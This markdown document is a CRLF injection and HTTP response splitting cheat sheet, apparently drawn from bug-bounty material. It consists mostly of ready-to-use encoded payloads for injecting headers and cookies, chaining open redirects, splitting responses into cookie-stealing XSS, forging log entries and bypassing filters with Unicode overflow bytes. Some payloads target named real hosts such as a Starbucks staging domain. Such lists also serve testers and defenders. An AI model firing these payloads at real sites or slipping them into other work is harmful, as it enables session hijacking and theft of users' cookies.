### CRLF Injection || HTTP Response Splitting

#### 1. Header-based Test
- **Set-Cookie Injection**:
  ```
  %0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
  ```

- **Basic CRLF Injection**:
  ```
  %0d%0aheader:header
  %0aheader:header
  %0dheader:header
  %23%0dheader:header
  %3f%0dheader:header
  /%250aheader:header
  /%25250aheader:header
  /%%0a0aheader:header
  /%3f%0dheader:header
  /%23%0dheader:header
  /%25%30aheader:header
  /%25%30%61header:header
  /%u000aheader:header
  ```

#### 2. CRLF Chained with Open Redirect
- **Examples**:
  ```
  //www.google.com/%2f%2e%2e%0d%0aheader:header
  /www.google.com/%2e%2e%2f%0d%0aheader:header
  /google.com/%2F..%0d%0aheader:header
  ```

- **Twitter Specific CRLF** (by @filedescriptor):
  ```
  %E5%98%8A%E5%98%8Dheader:header
  ```

#### 3. CRLF Injection to XSS
- **Example**:
  ```
  %0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e
  ```

#### 4. Response Splitting on 302 Redirect
- **Example**:
  ```
  %0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert('XSS');%3C%2fscript%3E
  ```

#### 5. Response Splitting on 301 Code
- **Chained with Open Redirect** (by @black2fan, Facebook Bug):
  ```
  %2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(document.cookie)%3c/script%3e%2F..%2F..%2F..%2F../tr
  ```

---

### CRLF Injection in Log Files
- **Example**:
  ```
  123.123.123.123 - 08:15 - /index.php?page=home
  /index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
  ```

- **Result**:
  ```
  IP - Time - Visited Path
  123.123.123.123 - 08:15 - /index.php?page=home&
  127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
  ```

---

### HTTP Response Splitting
- **Description**:
  - Exploiting CRLF to split HTTP responses and inject malicious content.

- **Example**:
  ```
  X-Your-Name: Bob
  ?name=Bob%0d%0a%0d%0a<script>alert(document.domain)</script>
  ```

- **Redirect Example**:
  ```
  /%0d%0aLocation:%20http://myweb.com
  ```

- **XSS Example**:
  ```
  http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
  ```

---

### HTTP Header Injection
- **Description**:
  - Injecting headers to bypass security mechanisms like XSS filters or SOP.

- **Example**:
  ```
  http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
  ```

---

### Cheatsheet

#### 1. HTTP Response Splitting
- ```
  /%0D%0ASet-Cookie:mycookie=myvalue
  ```

#### 2. CRLF Chained with Open Redirect
- ```
  //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
  /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
  /google.com/%2F..%0D%0AHeader-Test:test2
  /%0d%0aLocation:%20http://example.com
  ```

#### 3. CRLF Injection to XSS
- ```
  /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
  /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
  ```

#### 4. Filter Bypass
- ```
  %E5%98%8A = %0A = \u560a
  %E5%98%8D = %0D = \u560d
  %E5%98%BE = %3E = \u563e (>)
  %E5%98%BC = %3C = \u563c (<)
  Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
  ```

---

### Tools
- **CRLFuzz**: [https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)

---
- https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows
### References
- [Exploiting HTTP Parsers Inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [Bug Bounty: Exploiting CRLF Injection](https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)
- [CRLF Cheatsheet](https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md)
- https://github.com/dwisiswant0/crlfuzz
- /r/t
--- 

